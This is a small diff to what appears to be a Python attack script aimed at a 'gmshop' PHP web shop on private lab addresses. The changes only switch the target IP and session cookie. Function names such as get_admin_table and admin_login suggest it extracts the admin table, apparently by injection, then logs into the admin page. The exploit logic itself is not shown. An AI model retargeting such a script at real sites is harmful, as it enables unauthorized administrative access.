@@ -2,8 +2,8 @@ from bs4 import BeautifulSoup
 import requests
 import re
 
-URL = 'http://192.168.81.129/gmshop/board_list.php'
-cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}
+URL = 'http://192.168.200.129/gmshop/board_list.php'
+cookies = {"PHPSESSID":"a796195aea1c9f9af451d66b66f75038"}
 
 
 
@@ -214,7 +214,7 @@ def get_admin_table(query):
 # admin page 접속
 def admin_login(account):
     print('[+] admin page 접속')
-    ADMINURL='http://192.168.81.129/gmshop/admin/'
+    ADMINURL='http://192.168.200.129/gmshop/admin/'
     res = requests.post(ADMINURL, data=account, cookies=cookies)    
     if res.status_code == 200:
         print('[+] admin page 접속 완료')  
